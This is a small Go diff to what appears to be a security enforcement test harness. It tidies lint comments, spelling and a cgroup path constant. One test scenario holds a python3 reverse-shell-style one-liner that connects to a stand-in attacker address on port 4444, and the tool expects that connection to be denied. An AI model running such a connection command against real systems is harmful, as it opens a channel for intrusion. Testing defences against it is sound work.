@@ -207,7 +207,7 @@ func driveTraffic(port int, every time.Duration, stop <-chan struct{}, r *run) {
 		case <-t.C:
 			url := fmt.Sprintf("http://127.0.0.1:%d%s", port, paths[i%len(paths)])
 			i++
-			resp, err := client.Get(url) //nolint:noctx // the client's own timeout bounds this
+			resp, err := client.Get(url)
 			if err != nil {
 				r.mu.Lock()
 				r.requestErrors++
@@ -268,7 +268,7 @@ func runScenarios(cgPath string, port int, obs *observer) []scenario {
 	// the two is the easiest way to misread what this tool enforces.
 	httpClient := &http.Client{Timeout: 3 * time.Second}
 	probeApp := func() (string, error) {
-		resp, err := httpClient.Get(fmt.Sprintf("http://127.0.0.1:%d/health", port)) //nolint:noctx // bounded by the client timeout
+		resp, err := httpClient.Get(fmt.Sprintf("http://127.0.0.1:%d/health", port))
 		if err != nil {
 			return "", err
 		}
@@ -306,7 +306,7 @@ func runScenarios(cgPath string, port int, obs *observer) []scenario {
 			name: "Reverse shell through the interpreter already in the image",
 			story: "The realistic post-exploitation move. python3 is present and " +
 				"learned - the application is written in it - so the exec succeeds. " +
-				"The connection is what fails: a static file server has never dialled " +
+				"The connection is what fails: a static file server has never dialed " +
 				"anything, so every outbound destination is new.",
 			cmd:    py("import socket;socket.create_connection(('203.0.113.7',4444),2)"),
 			expect: "denied",
@@ -671,7 +671,8 @@ func limit(s []string, n int) []string {
 // --- plumbing -------------------------------------------------------------------
 
 func makeCgroup(name string) (string, uint64, error) {
-	path := filepath.Join("/sys/fs/cgroup", name)
+	const cgroupRoot = "/sys/fs/cgroup"
+	path := filepath.Join(cgroupRoot, name)
 	if err := os.Mkdir(path, 0o755); err != nil && !os.IsExist(err) {
 		return "", 0, err
 	}
